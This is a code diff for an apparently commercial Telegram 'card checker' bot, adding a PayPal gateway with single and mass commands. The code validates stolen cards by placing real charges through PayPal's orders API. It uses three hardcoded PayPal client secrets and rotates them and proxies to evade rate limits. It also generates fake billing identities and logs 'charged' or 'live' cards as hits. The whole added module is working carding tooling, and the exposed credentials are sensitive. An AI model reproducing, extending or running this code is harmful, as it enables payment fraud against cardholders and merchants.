@@ -16696,7 +16696,7 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Card format: <code>cc|mm|yy|cvv</code>\n"
             "Example: <code>/stco https://checkout.stripe.com/xxx 4242424242424242|12|26|123</code>\n\n"
             "Proxy: <code>/addproxy user:pass@host:port</code>\n"
-            "🔒 TLS bypass & connection pooling enabled",
+            "",
             parse_mode=ParseMode.HTML
         )
         return
@@ -18185,7 +18185,7 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Usage:\n"
             "<code>/jhit &lt;phone&gt; &lt;amount&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
             "Example:\n"
-            "<code>/jhit 6398093450 19 4232231137515675|09|26|593</code>\n\n"
+            "<code>/jhit 093450 19 2231137515675|09|26|593</code>\n\n"
             "📱 <b>phone</b> - Jio mobile number\n"
             "💰 <b>amount</b> - Recharge amount (₹)\n"
             "💳 <b>card(s)</b> - One or more cards in cc|mm|yy|cvv format\n\n"
@@ -18200,7 +18200,7 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await message.reply_text(
             "❌ <b>Invalid format</b>\n\n"
             "Usage: <code>/jhit &lt;phone&gt; &lt;amount&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n"
-            "Example: <code>/jhit 6398093450 19 4232231137515675|09|26|593</code>",
+            "Example: <code>/jhit </code>",
             parse_mode=ParseMode.HTML
         )
         return
@@ -22952,6 +22952,7 @@ class UserManager:
         "stripe_chk",        # /chk
         "shopify",           # /sh
         "stripe_sk",         # /sk
+        "paypal",
     ]
 
     # ─────────────────────────────────────────────────────────────
@@ -23038,6 +23039,7 @@ class UserManager:
                 "paypal",
                 "stripe_charge_v2",
                 "adyen",
+                "paypal",
                 "stripe_pl",
                 "stripe_auth0",
                 "b3charged",
@@ -34289,6 +34291,1050 @@ async def disable_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         parse_mode=ParseMode.HTML,
         reply_markup=back_menu()
     )
+    
+    
+    
+# ═══════════════════════════════════════════════════════════════════════════
+#  PAYPAL DIRECT API GATEWAY (multi-key pool + proxy)  —  /pp  &  /mpp
+# ═══════════════════════════════════════════════════════════════════════════
+
+import uuid
+import random
+from faker import Faker
+from typing import Dict, List, Optional, Tuple
+
+# ── Multi-key pool ─────────────────────────────────────────────────────────
+PAYPAL_KEY_POOL = [
+    {
+        "name":           "PayPal Key #1",
+        "client_id":      "ARq4HNMYh5i_QXYo8uTTWWDDk57qtgjSVpYqofzBm2Bft5T5TlrOaPUf_wsBXHXF8P1xIb7LhvLlv5Hu",
+        "client_secret":  "ED7GVfyKNd4Gcx2GG4TELgSi4xkCpKxlnea40AYF4VABtbyuGldO8xSrpPa9o1uRJPUIxPlZFxoxFMEa",
+        "enabled":        True,
+        "fail_count":     0,
+        "success_count":  0,
+        "token":          None,
+        "token_expires":  0,
+        "last_used":      0,
+        "cooldown_until": 0,
+    },
+    {
+        "name":           "PayPal Key #2",
+        "client_id":      "AdpGwhOWb2JVMWuH-eHgVJssICugBJ4rKWnStNLZYVOniyvojJBa7X0oik5L-0F2ASwUdum5bUNVCtn1",
+        "client_secret":  "EKSFM0d1aNV-Fh5MBApXj4uky5gv2w5ORFDrrQqd36-6GKaTpJcPCAcA5bg507Smvzr39CNW7NXgnh94",
+        "enabled":        True,
+        "fail_count":     0,
+        "success_count":  0,
+        "token":          None,
+        "token_expires":  0,
+        "last_used":      0,
+        "cooldown_until": 0,
+    },
+    {
+        "name":           "PayPal Key #3",
+        "client_id":      "AVaRND-jngUPPnF5jEwcFuBeZvyw8PqJ1sTKkNkseiPJcv249ukN62frI5apjKK_AOA5-HKFBfGUtCZ3",
+        "client_secret":  "EHWGCIsPf6zVCiURQCOXXkOR8jsqxxx5sd_GXjtOGePZJIZJxlW2fqxkSiUVb0tg_l3YoP15qbIHB_3d",
+        "enabled":        True,
+        "fail_count":     0,
+        "success_count":  0,
+        "token":          None,
+        "token_expires":  0,
+        "last_used":      0,
+        "cooldown_until": 0,
+    },
+]
+
+PAYPAL_KEY_BASE   = 'https://api-m.paypal.com'
+PAYPAL_KEY_AMOUNT = '1.00'
+PAYPAL_KEY_LABEL  = 'PayPal'
+
+PAYPAL_KEY_MAX_FAILS    = 5
+PAYPAL_KEY_429_COOLDOWN = 300   # 5 min
+PPK_DEBUG_EGRESS        = True  # set False to disable egress-IP debug print
+
+_US_STATES_PPK = [
+    'AL','AK','AZ','AR','CA','CO','CT','DE','DC','FL','GA','HI','ID','IL','IN','IA',
+    'KS','KY','LA','ME','MD','MA','MI','MN','MS','MO','MT','NE','NV','NH','NJ','NM',
+    'NY','NC','ND','OH','OK','OR','PA','RI','SC','SD','TN','TX','UT','VT','VA','WA',
+    'WV','WI','WY'
+]
+
+_ppk_fake = Faker()
+
+paypal_key_active_tasks: dict = {}
+
+_ppk_rotation_lock  = asyncio.Lock()
+_ppk_rotation_index = 0
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  PROXY HELPERS
+# ═══════════════════════════════════════════════════════════════════════════
+def _ppk_proxy_url(proxy: str) -> Optional[str]:
+    """Normalise any proxy string into an httpx-compatible URL."""
+    if not proxy:
+        return None
+    p = proxy.strip()
+    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
+        return p
+    if '@' in p:
+        return f"http://{p}"
+    parts = p.split(':')
+    if len(parts) == 4:
+        host, port, user, pwd = parts
+        return f"http://{user}:{pwd}@{host}:{port}"
+    if len(parts) == 2:
+        return f"http://{p}"
+    return None
+
+
+def _ppk_pick_proxy(user_id: int) -> Optional[str]:
+    """3-tier proxy lookup: tracker → raw user pool → global pool."""
+    if not user_manager.can_use_proxy(user_id):
+        print(f"⚠️ [PPK] User {user_id} not allowed to use proxies")
+        return None
+
+    # 1) tested working proxies
+    if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+        lst = autosopi_proxy_tracker.working_proxies[user_id]
+        if lst:
+            print(f"🔌 [PPK] Using tracker proxy: {mask_proxy(lst[0])}")
+            return lst[0]
+
+    # 2) raw user pool (rotating)
+    raw = proxy_manager.user_proxies.get(user_id, [])
+    if raw:
+        idx = proxy_manager.user_proxy_index.get(user_id, 0)
+        chosen = raw[idx % len(raw)]
+        proxy_manager.user_proxy_index[user_id] = idx + 1
+        print(f"🔌 [PPK] Using raw-pool proxy #{idx+1}/{len(raw)}: {mask_proxy(chosen)}")
+        return chosen
+
+    # 3) global pool
+    if global_proxy_pool.enabled and global_proxy_pool.proxies:
+        chosen = global_proxy_pool.get_next_proxy()
+        if chosen:
+            print(f"🌐 [PPK] Using global proxy: {mask_proxy(chosen)}")
+            return chosen
+
+    print(f"⚠️ [PPK] No proxy available for user {user_id}")
+    return None
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  KEY ROTATION
+# ═══════════════════════════════════════════════════════════════════════════
+async def _ppk_pick_key() -> Optional[dict]:
+    """Round-robin among enabled keys. Auto-revive cooldown-expired keys."""
+    global _ppk_rotation_index
+
+    async with _ppk_rotation_lock:
+        now = time.time()
+
+        # revive any cooldown-expired key
+        for k in PAYPAL_KEY_POOL:
+            cd = k.get("cooldown_until", 0)
+            if not k["enabled"] and cd and now >= cd:
+                print(f"♻️ [PPK] {k['name']} cooldown expired → re-enabled")
+                k["enabled"]        = True
+                k["cooldown_until"] = 0
+                k["fail_count"]     = 0
+
+        enabled = [k for k in PAYPAL_KEY_POOL if k["enabled"]]
+
+        if not enabled:
+            print("⚠️ [PPK] All keys disabled — soft resetting pool")
+            for k in PAYPAL_KEY_POOL:
+                k["enabled"]        = True
+                k["fail_count"]     = 0
+                k["cooldown_until"] = 0
+            enabled = PAYPAL_KEY_POOL
+
+        n = len(enabled)
+        _ppk_rotation_index = (_ppk_rotation_index + 1) % n
+        chosen = enabled[_ppk_rotation_index % n]
+        chosen["last_used"] = time.time()
+        return chosen
+
+
+def _ppk_mark_result(key: dict, success: bool):
+    """Mark key success/failure; auto-disable after N consecutive fails."""
+    if key is None:
+        return
+    if success:
+        key["success_count"] = key.get("success_count", 0) + 1
+        key["fail_count"]    = 0
+    else:
+        key["fail_count"] = key.get("fail_count", 0) + 1
+        if key["fail_count"] >= PAYPAL_KEY_MAX_FAILS:
+            key["enabled"] = False
+            print(f"⚠️ [PPK] Disabling {key['name']} after {key['fail_count']} fails")
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  OAUTH TOKEN (per-key cache ~50 min)
+# ═══════════════════════════════════════════════════════════════════════════
+async def _ppk_get_token(key: dict) -> Optional[str]:
+    now = time.time()
+    if key.get("token") and now < key.get("token_expires", 0):
+        return key["token"]
+
+    try:
+        async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
+            r = await client.post(
+                f'{PAYPAL_KEY_BASE}/v1/oauth2/token',
+                auth=(key["client_id"], key["client_secret"]),
+                data={'grant_type': 'client_credentials'},
+                headers={
+                    'Accept': 'application/json',
+                    'Accept-Language': 'en_US',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+            )
+        if r.status_code != 200:
+            print(f"❌ [PPK] {key['name']} token HTTP {r.status_code}: {r.text[:200]}")
+            return None
+        j = r.json()
+        tok = j.get('access_token')
+        if tok:
+            key["token"]         = tok
+            key["token_expires"] = now + 3000
+            print(f"✅ [PPK] {key['name']} new token cached")
+            return tok
+        print(f"❌ [PPK] {key['name']} no access_token: {j}")
+        return None
+    except Exception as e:
+        print(f"❌ [PPK] {key['name']} token exception: {e}")
+        return None
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  CORE CHECK — multi-key rotation + proxy
+# ═══════════════════════════════════════════════════════════════════════════
+async def check_card_paypal_key(card: str,
+                                 amount: str = PAYPAL_KEY_AMOUNT,
+                                 proxy: str = None) -> Dict:
+    print(f"\n{'='*80}")
+    print(f"💳 [PAYPAL KEY] Checking: {card[:20]}... amount=${amount}")
+    if proxy:
+        print(f"🔌 [PPK] Proxy argument: {mask_proxy(proxy)}")
+    else:
+        print(f"🔌 [PPK] No proxy argument passed")
+    print(f"{'='*80}")
+
+    default_result = {
+        "status": "error", "result": "UNKNOWN_ERROR",
+        "message": "Unknown error occurred",
+        "status_display": "⚠️ ERROR",
+        "status_category": "error",
+        "elapsed": 0,
+        "price": f"${amount}",
+        "gateway": PAYPAL_KEY_LABEL,
+    }
+
+    start_time = time.time()
+
+    try:
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {
+                "status": "error", "result": "INVALID_FORMAT",
+                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
+                "status_display": "⚠️ INVALID FORMAT",
+                "status_category": "error",
+                "elapsed": 0, "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+            }
+
+        cc, mm, yy, cvv = parts
+        cc = cc.strip().replace(' ', '')
+        mm = mm.strip().zfill(2)
+        yy = yy.strip()
+        if len(yy) == 2:
+            yy = '20' + yy
+        cvv = cvv.strip()
+
+        if not (13 <= len(cc) <= 19):
+            return {
+                "status": "error", "result": "INVALID_CARD",
+                "message": "Invalid card length",
+                "status_display": "⚠️ INVALID CARD",
+                "status_category": "error",
+                "elapsed": time.time() - start_time,
+                "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+            }
+
+        fname   = _ppk_fake.first_name()
+        lname   = _ppk_fake.last_name()
+        street  = _ppk_fake.street_address()
+        city    = _ppk_fake.city()
+        state   = random.choice(_US_STATES_PPK)
+        zipcode = _ppk_fake.zipcode()
+
+        # ── Proxy config ─────────────────────────────────────────────────
+        client_kwargs = {
+            'timeout': httpx.Timeout(30.0, connect=10.0, read=25.0),
+            'verify': False,
+            'follow_redirects': True,
+        }
+        if proxy:
+            proxy_url = _ppk_proxy_url(proxy)
+            if proxy_url:
+                client_kwargs['proxy'] = proxy_url
+                print(f"🔌 [PPK] Using proxy: {mask_proxy(proxy_url)}")
+            else:
+                print(f"⚠️ [PPK] Could not format proxy: {proxy[:40]}…")
+
+        # ── Egress IP debug (optional) ───────────────────────────────────
+        if PPK_DEBUG_EGRESS:
+            try:
+                async with httpx.AsyncClient(**client_kwargs) as _c:
+                    _r = await _c.get("https://api.ipify.org?format=json", timeout=8.0)
+                    print(f"🌍 [PPK] Egress IP: {_r.json()}")
+            except Exception as _e:
+                print(f"⚠️ [PPK] Egress IP check failed: {_e}")
+
+        # ═════════════════════════════════════════════════════════════════
+        #  TRY UP TO 3 KEYS
+        # ═════════════════════════════════════════════════════════════════
+        max_attempts = 3
+        tried_keys   = []
+
+        for attempt in range(1, max_attempts + 1):
+            key = await _ppk_pick_key()
+            if key is None:
+                break
+            if key["name"] in tried_keys:
+                key = await _ppk_pick_key()
+                if key is None or key["name"] in tried_keys:
+                    break
+            tried_keys.append(key["name"])
+            print(f"🔑 [PPK] Attempt {attempt}/{max_attempts} using {key['name']}")
+
+            token = await _ppk_get_token(key)
+            if not token:
+                _ppk_mark_result(key, False)
+                continue
+
+            headers = {
+                'Authorization':     f'Bearer {token}',
+                'Content-Type':      'application/json',
+                'Accept':            'application/json',
+                'PayPal-Request-Id': str(uuid.uuid4()),
+                'Prefer':            'return=representation',
+            }
+
+            order_payload = {
+                "intent": "CAPTURE",
+                "purchase_units": [{
+                    "amount": {
+                        "currency_code": "USD",
+                        "value": f"{float(amount):.2f}",
+                    },
+                    "description": "Payment",
+                }],
+                "payment_source": {
+                    "card": {
+                        "number":        cc,
+                        "expiry":        f"{yy}-{mm}",
+                        "security_code": cvv,
+                        "name":          f"{fname} {lname}",
+                        "billing_address": {
+                            "address_line_1": street,
+                            "admin_area_2":   city,
+                            "admin_area_1":   state,
+                            "postal_code":    zipcode,
+                            "country_code":   "US",
+                        },
+                        "attributes": {
+                            "verification": {"method": "SCA_WHEN_REQUIRED"}
+                        },
+                    }
+                },
+            }
+
+            try:
+                async with httpx.AsyncClient(**client_kwargs) as client:
+                    r2 = await client.post(
+                        f'{PAYPAL_KEY_BASE}/v2/checkout/orders',
+                        headers=headers,
+                        json=order_payload,
+                    )
+            except httpx.ProxyError as pe:
+                print(f"⚠️ [PPK] Proxy error on {key['name']}: {pe} → retry without proxy")
+                client_kwargs_np = dict(client_kwargs)
+                client_kwargs_np.pop('proxy', None)
+                try:
+                    async with httpx.AsyncClient(**client_kwargs_np) as client:
+                        r2 = await client.post(
+                            f'{PAYPAL_KEY_BASE}/v2/checkout/orders',
+                            headers=headers,
+                            json=order_payload,
+                        )
+                except Exception as ee:
+                    print(f"❌ [PPK] {key['name']} retry failed: {ee}")
+                    _ppk_mark_result(key, False)
+                    continue
+            except Exception as e:
+                print(f"❌ [PPK] {key['name']} request failed: {e}")
+                _ppk_mark_result(key, False)
+                continue
+
+            print(f"📥 [PPK] {key['name']} order status: {r2.status_code}")
+            print(f"📥 [PPK] {key['name']} order body: {r2.text[:400]}")
+
+            try:
+                order_json = r2.json()
+            except Exception:
+                _ppk_mark_result(key, False)
+                return {
+                    "status": "error", "result": "PARSE_ERROR",
+                    "message": "Invalid JSON from PayPal",
+                    "status_display": "⚠️ PARSE ERROR",
+                    "status_category": "error",
+                    "elapsed": time.time() - start_time,
+                    "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+                }
+
+            def _extract_error(j: dict) -> str:
+                for d in (j.get('details') or []):
+                    if d.get('description'):
+                        return d['description']
+                    if d.get('issue'):
+                        return d['issue']
+                return j.get('message') or j.get('name') or (r2.text[:150] if r2.text else 'Unknown error')
+
+            def _classify_error(err: str) -> Dict:
+                u = err.upper()
+                if 'INSUFFICIENT' in u or 'FUNDS' in u:
+                    return {"status": "success", "result": "INSUFFICIENT_FUNDS",
+                            "message": f"Insufficient funds: {err}",
+                            "status_display": "💰 INSUFFICIENT FUNDS",
+                            "status_category": "approved"}
+                if 'CVV' in u or 'SECURITY CODE' in u:
+                    return {"status": "success", "result": "CVV_LIVE",
+                            "message": f"CVV Live: {err}",
+                            "status_display": "✅ CVV LIVE",
+                            "status_category": "approved"}
+                if '3D' in u or 'AUTHENTICATION' in u or 'SCA' in u:
+                    return {"status": "success", "result": "3DS_REQUIRED",
+                            "message": f"3DS required: {err}",
+                            "status_display": "🔐 3D REQUIRED",
+                            "status_category": "approved"}
+                return {"status": "declined", "result": "DECLINED",
+                        "message": err,
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined"}
+
+            # ── HTTP errors ──────────────────────────────────────────────
+            if r2.status_code not in (200, 201):
+                err_str = _extract_error(order_json)
+                err_up  = err_str.upper()
+
+                if r2.status_code == 429 or 'RATE_LIMIT_REACHED' in err_up:
+                    print(f"⏸️ [PPK] {key['name']} rate-limited → cooldown {PAYPAL_KEY_429_COOLDOWN}s")
+                    key["enabled"]        = False
+                    key["cooldown_until"] = time.time() + PAYPAL_KEY_429_COOLDOWN
+                    key["fail_count"]     = 0
+                    continue
+
+                if r2.status_code in (401, 403) or 'AUTHENTICATION_FAILURE' in err_up:
+                    _ppk_mark_result(key, False)
+                    continue
+
+                _ppk_mark_result(key, True)
+                base = _classify_error(err_str)
+                base["elapsed"]  = time.time() - start_time
+                base["price"]    = f"${amount}"
+                base["gateway"]  = PAYPAL_KEY_LABEL
+                base["key_used"] = key["name"]
+                return base
+
+            # ── Success ──────────────────────────────────────────────────
+            _ppk_mark_result(key, True)
+
+            order_id     = order_json.get('id', '')
+            order_status = order_json.get('status', '')
+            print(f"✅ [PPK] {key['name']} order {order_id} status={order_status}")
+
+            if order_status == 'COMPLETED':
+                return {
+                    "status": "success", "result": "CHARGED",
+                    "message": "Payment successful ",
+                    "status_display": "🔥 CHARGED 🔥",
+                    "status_category": "charged",
+                    "elapsed": time.time() - start_time,
+                    "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+                    "key_used": key["name"],
+                }
+
+            for link in order_json.get('links', []):
+                if link.get('rel') in ('approve', 'payer-action'):
+                    return {
+                        "status": "success", "result": "3DS_REQUIRED",
+                        "message": "3DS authentication required",
+                        "status_display": "🔐 3D REQUIRED",
+                        "status_category": "approved",
+                        "elapsed": time.time() - start_time,
+                        "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+                        "key_used": key["name"],
+                    }
+
+            if order_status == 'PAYER_ACTION_REQUIRED':
+                return {
+                    "status": "success", "result": "3DS_REQUIRED",
+                    "message": "3DS required (payer action)",
+                    "status_display": "🔐 3D REQUIRED",
+                    "status_category": "approved",
+                    "elapsed": time.time() - start_time,
+                    "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+                    "key_used": key["name"],
+                }
+
+            if order_status in ('APPROVED', 'CREATED', 'SAVED'):
+                cap_headers = headers.copy()
+                cap_headers['PayPal-Request-Id'] = str(uuid.uuid4())
+
+                try:
+                    async with httpx.AsyncClient(**client_kwargs) as client:
+                        r3 = await client.post(
+                            f'{PAYPAL_KEY_BASE}/v2/checkout/orders/{order_id}/capture',
+                            headers=cap_headers,
+                            json={},
+                        )
+                except Exception as e:
+                    print(f"❌ [PPK] capture error: {e}")
+                    return {
+                        "status": "error", "result": "CAPTURE_ERROR",
+                        "message": str(e)[:100],
+                        "status_display": "⚠️ CAPTURE ERROR",
+                        "status_category": "error",
+                        "elapsed": time.time() - start_time,
+                        "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+                    }
+
+                print(f"📥 [PPK] capture status: {r3.status_code}")
+                print(f"📥 [PPK] capture body: {r3.text[:400]}")
+
+                try:
+                    cap_json = r3.json()
+                except Exception:
+                    cap_json = {}
+
+                if r3.status_code in (200, 201):
+                    cap_status = cap_json.get('status', '')
+                    if cap_status == 'COMPLETED':
+                        return {
+                            "status": "success", "result": "CHARGED",
+                            "message": "Payment successful — captured",
+                            "status_display": "🔥 CHARGED 🔥",
+                            "status_category": "charged",
+                            "elapsed": time.time() - start_time,
+                            "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+                            "key_used": key["name"],
+                        }
+                    return {
+                        "status": "declined", "result": "DECLINED",
+                        "message": f"Capture status: {cap_status}",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": time.time() - start_time,
+                        "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+                        "key_used": key["name"],
+                    }
+
+                base = _classify_error(_extract_error(cap_json))
+                base["elapsed"]  = time.time() - start_time
+                base["price"]    = f"${amount}"
+                base["gateway"]  = PAYPAL_KEY_LABEL
+                base["key_used"] = key["name"]
+                return base
+
+            return {
+                "status": "declined", "result": "DECLINED",
+                "message": f"Order status: {order_status or 'Unknown'}",
+                "status_display": "❌ DECLINED",
+                "status_category": "declined",
+                "elapsed": time.time() - start_time,
+                "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+                "key_used": key["name"],
+            }
+
+        return {
+            "status": "error", "result": "ALL_KEYS_FAILED",
+            "message": "All PayPal keys failed",
+            "status_display": "⚠️ ALL KEYS FAILED",
+            "status_category": "error",
+            "elapsed": time.time() - start_time,
+            "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+        }
+
+    except httpx.TimeoutException:
+        return {
+            "status": "error", "result": "TIMEOUT",
+            "message": "Request timed out",
+            "status_display": "⚠️ TIMEOUT",
+            "status_category": "error",
+            "elapsed": time.time() - start_time,
+            "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+        }
+    except Exception as e:
+        print(f"❌ [PPK] Exception: {e}")
+        traceback.print_exc()
+        return {
+            "status": "error", "result": "ERROR",
+            "message": str(e)[:100],
+            "status_display": "⚠️ ERROR",
+            "status_category": "error",
+            "elapsed": time.time() - start_time,
+            "price": f"${amount}", "gateway": PAYPAL_KEY_LABEL,
+        }
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  FORMATTER — premium-emoji layout like Shopify
+# ═══════════════════════════════════════════════════════════════════════════
+def format_paypal_key_response(result: Dict, card: str, bin_info: tuple,
+                                amount: str = PAYPAL_KEY_AMOUNT) -> Tuple[str, str]:
+    bin_info_text, bank, country, _, _ = bin_info
+
+    status_category = result.get("status_category", "unknown")
+    message         = result.get("message", "Unknown")
+
+    diamond_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
+    flower_emoji  = premium_emoji(PREMIUM_EMOJI_IDS.get("flower",  "6230927657257668107"), "🌸")
+    toy_emoji     = premium_emoji(PREMIUM_EMOJI_IDS.get("toy",     "5249244862359812334"), "📍")
+    doller_emoji  = premium_emoji(PREMIUM_EMOJI_IDS.get("doller",  "5197434882321567830"), "💵")
+    id_emoji      = premium_emoji(PREMIUM_EMOJI_IDS.get("id",      "5307905813451397794"), "👤")
+    bank_emoji    = premium_emoji(PREMIUM_EMOJI_IDS.get("bank",    "5332455502917949981"), "🏦")
+    star_emoji    = premium_emoji(PREMIUM_EMOJI_IDS.get("star",    "6282793227057632654"), "⭐")
+
+    clean_response = re.sub(r'<[^>]+>', '', str(message))
+    clean_response = re.sub(r'\s+', ' ', clean_response).strip()
+    if not clean_response:
+        clean_response = "Unknown"
+    if len(clean_response) > 100:
+        clean_response = clean_response[:97] + "..."
+
+    try:
+        price_str = f"{float(amount):.2f}$"
+    except (ValueError, TypeError):
+        price_str = f"{amount}$"
+
+    bank_display = bank if bank and bank != 'N/A' else "Unknown"
+    if len(bank_display) > 30:
+        bank_display = bank_display[:27] + "..."
+
+    country_name = str(country).replace('🌐', '').strip() or "Unknown"
+    flag_re = "🇦🇧🇨🇩🇪🇫🇬🇭🇮🇯🇰🇱🇲🇳🇴🇵🇶🇷🇸🇹🇺🇻🇼🇽🇾🇿"
+    if any(ch in country_name for ch in flag_re):
+        country_display = country_name
+    else:
+        flag_map = {
+            "USA": "🇺🇸", "UNITED STATES": "🇺🇸", "UK": "🇬🇧", "UNITED KINGDOM": "🇬🇧",
+            "CANADA": "🇨🇦", "AUSTRALIA": "🇦🇺", "INDIA": "🇮🇳", "UAE": "🇦🇪",
+            "MALAYSIA": "🇲🇾", "SINGAPORE": "🇸🇬", "THAILAND": "🇹🇭", "INDONESIA": "🇮🇩",
+            "PHILIPPINES": "🇵🇭", "VIETNAM": "🇻🇳", "JAPAN": "🇯🇵", "KOREA": "🇰🇷",
+            "GERMANY": "🇩🇪", "FRANCE": "🇫🇷", "ITALY": "🇮🇹", "SPAIN": "🇪🇸",
+        }
+        flag = "🌍"
+        upper_country = country_name.upper()
+        for k, v in flag_map.items():
+            if k in upper_country:
+                flag = v
+                break
+        country_display = f"{flag}  {country_name}"
+
+    ui = (
+        f"<b>{PAYPAL_KEY_LABEL}</b> {diamond_emoji}\n\n"
+        f"{flower_emoji} 𝗖𝗔𝗥𝗗  ↣ <code>{card}</code>\n\n"
+        f"{toy_emoji} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲  ↣  {clean_response}\n"
+        f"{doller_emoji} 𝗣𝗿𝗶𝗰𝗲  ↣  {price_str}\n\n"
+        f"{id_emoji} 𝗕𝗜𝗡  ↣  {bin_info_text}\n"
+        f"{bank_emoji} 𝗕𝗮𝗻𝗸  ↣  {bank_display}\n"
+        f" {star_emoji} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆  ↣  {country_display}"
+    )
+    return ui, status_category
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  /pp — SINGLE
+# ═══════════════════════════════════════════════════════════════════════════
+@check_gateway("paypal")
+async def paypal_key_single_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await verify_group_access(update, context):
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>PayPal — Single Check</b>\n\n"
+            "Usage: <code>/pp &lt;card&gt;</code>\n"
+            "Example: <code>/pp 4111111111111111|12|2028|123</code>\n\n"
+            f"💰 Amount: ${PAYPAL_KEY_AMOUNT}",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+    card_text = " ".join(context.args).strip()
+
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text("❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV")
+        return
+
+    if not await require_gateway_access(user_id, "paypal", message):
+        return
+
+    can_proceed, error_msg = await check_and_deduct_credits(
+        user_id, update, context, is_mass_check=False, card_count=1
+    )
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+
+    paypal_key_active_tasks[user_id] = True
+    status_msg = None
+
+    try:
+        tier   = user_manager.get_tier(user_id)
+        amount = context.user_data.get("payment_amount", PAYPAL_KEY_AMOUNT)
+
+        status_msg = await message.reply_text("🔄 Checking card with PayPal...")
+
+        # ── 3-tier proxy lookup ──────────────────────────────────────────
+        proxy_str = _ppk_pick_proxy(user_id)
+
+        result   = await check_card_paypal_key(card, str(amount), proxy_str)
+        bin_info = await get_bin_info(card)
+
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+
+        ui, status_category = format_paypal_key_response(result, card, bin_info, str(amount))
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+
+        if status_category in ("charged", "approved"):
+            await save_hit_to_file(
+                card=card, gateway=PAYPAL_KEY_LABEL,
+                response=result.get("message", "Approved"),
+                price=f"${amount}",
+                bin_info=bin_info, user_id=user_id, user_tier=tier,
+            )
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway=PAYPAL_KEY_LABEL,
+                    card=card, response=result.get("message", "Charged"),
+                    price=f"${amount}",
+                    user=user_data, bin_info=bin_info, status_category="charged",
+                )
+                user_manager.increment_hits(user_id)
+
+        user_manager.increment_checks(user_id)
+
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [PP Single] {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+    finally:
+        paypal_key_active_tasks.pop(user_id, None)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  /mpp — MASS
+# ═══════════════════════════════════════════════════════════════════════════
+@check_gateway("paypal")
+async def paypal_key_mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    if user_id in paypal_key_active_tasks:
+        await message.reply_text("⚠️ You already have an active PayPal session. Use /stop.")
+        return
+
+    if not await require_gateway_access(user_id, "paypal", message):
+        return
+
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n"
+            f"Use /pp for single checks.",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    cards: List[str] = []
+
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            f = await message.reply_to_message.document.get_file()
+            raw = await f.download_as_bytearray()
+            content = raw.decode('utf-8', errors='ignore')
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    c = card_formatter.extract_single_card_from_text(line)
+                    if c:
+                        cards.append(c)
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+    elif context.args:
+        for tok in " ".join(context.args).split():
+            c = card_formatter.extract_single_card_from_text(tok)
+            if c:
+                cards.append(c)
+    else:
+        await message.reply_text(
+            "📦 <b>PayPal — Mass Check</b>\n\n"
+            "Usage:\n"
+            "• <code>/mpp &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "• Reply to a .txt file with <code>/mpp</code>",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Truncated to {max_batch} cards.")
+
